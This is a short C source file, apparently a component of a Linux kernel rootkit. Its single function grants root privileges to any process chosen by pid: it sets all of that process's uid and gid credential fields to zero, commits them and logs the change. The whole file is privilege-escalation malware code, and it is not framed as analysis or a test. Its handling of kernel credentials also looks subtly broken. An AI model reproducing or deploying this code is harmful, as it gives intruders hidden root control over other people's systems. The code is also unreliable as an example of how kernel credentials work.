#include "give_root.h"

int give_root_by_process_pid(int pid){
    struct cred *newcreds;
    struct task_struct *task;
    find_get_task_by_vpid_t find_get_task_by_vpid;
    find_get_task_by_vpid = (find_get_task_by_vpid_t)lookup_addr_by_name("find_get_task_by_vpid");
    task = (struct task_struct *)find_get_task_by_vpid(pid);
    if (task == NULL)
        return -ESRCH;
    newcreds = (struct cred *)get_task_cred(task);
    if (newcreds == NULL)
        return -ESRCH;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) && defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) || LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
    newcreds->uid.val = newcreds->gid.val = 0;
    newcreds->euid.val = newcreds->egid.val = 0;
    newcreds->suid.val = newcreds->sgid.val = 0;
    newcreds->fsuid.val = newcreds->fsgid.val = 0;
#else
    newcreds->uid = newcreds->gid = 0;
    newcreds->euid = newcreds->egid = 0;
    newcreds->suid = newcreds->sgid = 0;
    newcreds->fsuid = newcreds->fsgid = 0;
#endif
    commit_creds(newcreds);
    pr_info("pid %d has been given root priviledge\n",pid);
    return 0;
}